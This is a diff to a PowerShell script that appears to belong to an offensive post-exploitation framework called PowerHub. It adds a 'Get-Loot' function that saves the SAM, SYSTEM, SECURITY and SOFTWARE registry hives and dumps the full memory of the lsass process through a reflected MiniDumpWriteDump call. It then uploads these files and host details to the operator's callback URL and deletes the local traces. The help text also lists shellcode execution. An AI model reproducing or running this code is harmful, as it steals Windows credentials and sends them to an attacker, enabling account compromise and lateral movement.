@@ -412,7 +412,10 @@ function Send-File {
        [Byte[]]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName
+       [String[]]$FileName,
+
+       [Parameter(Mandatory=$False)]
+       [String] $LootId
     )
 
     if ($FileName) {
@@ -439,6 +442,7 @@ function Send-File {
     $postbody = [System.Text.Encoding]::UTF8.GetBytes($postbody)
 
     $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    if ($LootId) { $post_url += "&loot=$LootId" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -483,6 +487,9 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
        [Parameter(Mandatory=$False)]
        [String[]]$Name,
 
+       [Parameter(Mandatory=$false)]
+       [String] $LootId,
+
        [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
        $Stream
     )
@@ -496,14 +503,14 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
     end {
         if ($result) {
             {{'Write-Debug "Pushing stdin stream..."'|debug}}
-            if ($result.length -eq 1 -and $result[0] -is [System.String]) {
-                $Body = [system.Text.Encoding]::UTF8.GetBytes($result[0])
-                Send-File $Body $Name
+            if ($result.length -ge 1 -and $result[0] -is [System.String]) {
+                $result = $result -Join "`r`n"
+                $Body = [system.Text.Encoding]::UTF8.GetBytes($result)
             } else {
                 $Body = $result | ConvertTo-Json
                 $Body = [system.Text.Encoding]::UTF8.GetBytes($Body)
-                Send-File $Body $Name
             }
+            Send-File -LootId $LootId $Body $Name
         } else {
             ForEach ($file in $Files) {
                 {{'Write-Debug "Pushing $File..."'|debug}}
@@ -511,7 +518,7 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
                 if ($Name) { $filename = $name } else { $filename = $file }
 
-                Send-File $fileBin $filename
+                Send-File -LootId $LootId $fileBin $filename
 
             }
         }
@@ -572,11 +579,98 @@ Unmount the Webdav drive.
     }
 }
 
+
+function Get-SysInfo {
+<#
+.SYNOPSIS
+
+Return some basic information about the underlying system
+
+#>
+
+    $IPs = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress
+    $SysInfo = (Get-WMIObject win32_operatingsystem)
+    return  New-Object psobject -Property @{
+        name = $SysInfo.name.split('|')[0];
+        arch = $SysInfo.OSArchitecture;
+        version = $SysInfo.version;
+        hostname = $SysInfo.csname;
+        IPs = $IPs
+    }
+}
+
+
+function Get-Loot {
+<#
+.SYNOPSIS
+
+Grab credentials from the hard drive and from memory.
+
+Partially based on:
+    PowerSploit Function: Out-Minidump
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+#>
+    $LootId = ""
+    1..4 | %{ $LootId += '{0:x}' -f (Get-Random -Max 256) }
+    $SysInfo = Get-SysInfo
+    $SysInfo.IPs = $SysInfo.IPs -Join " "
+    $SysInfo = $SysInfo | ConvertTo-Csv -NoTypeInformation
+
+
+    $SamPath = Join-Path $env:TMP "sam"
+    $SystemPath = Join-Path $env:TMP "system"
+    $SecurityPath = Join-Path $env:TMP "security"
+    $SoftwarePath = Join-Path $env:TMP "software"
+    $DumpFilePath = $env:TMP
+
+    $Process = Get-Process lsass
+    $ProcessId = $Process.Id
+    $ProcessName = $Process.Name
+    $ProcessHandle = $Process.Handle
+    $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
+    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+    $MiniDumpWithFullMemory = [UInt32] 2
+
+    try {
+        & reg save HKLM\SAM $SamPath /y
+        & reg save HKLM\SYSTEM $SystemPath /y
+        & reg save HKLM\SECURITY $SecurityPath /y
+        & reg save HKLM\SOFTWARE $SoftwarePath /y
+
+        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+                                                     $ProcessId,
+                                                     $FileStream.SafeFileHandle,
+                                                     $MiniDumpWithFullMemory,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero))
+        $FileStream.Close()
+
+        $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
+        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
+            if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
+        }
+    } finally {
+        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
+            try { Remove-Item -Force $f} catch {}
+        }
+    }
+}
+
+
 function Help-PowerHub {
     Write-Host @"
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
   * Load-HubModule (lhm)
+  * Get-Loot (glo)
   * Run-Exe (re)
   * Run-DotNETExe (rdne)
   * Run-Shellcode (rsh)
@@ -591,6 +685,7 @@ Use 'Get-Help' to learn more about those functions.
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
+try { New-Alias -Name glo -Value Get-Loot } catch { }
 try { New-Alias -Name re -Value Run-Exe } catch { }
 try { New-Alias -Name rdne -Value Run-DotNETExe } catch { }
 try { New-Alias -Name rsh -Value Run-Shellcode } catch { }
